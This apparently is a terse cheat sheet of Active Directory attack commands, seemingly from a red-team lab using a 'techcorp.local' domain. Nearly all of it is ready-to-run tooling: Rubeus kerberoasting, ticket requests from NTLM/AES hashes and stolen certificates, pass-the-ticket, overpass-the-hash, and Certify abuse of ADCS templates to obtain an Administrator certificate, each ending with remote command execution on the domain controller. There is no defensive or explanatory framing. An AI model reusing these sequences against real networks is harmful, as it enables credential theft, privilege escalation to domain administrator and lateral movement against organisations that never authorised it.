### Rubeus
```
Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```
```
Rubeus.exe asktgt /user:pawadmin$ /rc4:<> /ptt
Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
Rubeus.exe ptt /ticket:TGTofUS-DC$
winrs -r:us-dc whoami
```
### Overpass-the-Hash
````
execute-assembly C:\Users\Public\Rubeus.exe  triage
Rubeus asktgt /user:n.John /rc4:2e8a408a8aec852ef2e458b938b8c071
Rubeus ptt /ticket:doIFXDCCBVi[…snip…]bDWN5YmVyYm90aWMuaW8=
winrs -r:us-dc whoami
````
### ADCS
```
Certify.exe cas
Certify.exe find
Certify.exe find /enrolleeSuppliesSubject
Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
Certify.exe request /ca:TechcorpDC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
openssl.exe pkcs12 -in C:\AD\Tools\cert.pem - keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
winrs -r:us-dc whoami
```
### 
```
C:\AD\Tools\Rubeus.exe asktgt /domain:us.techcorp.local /user:helpdeskadmin /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
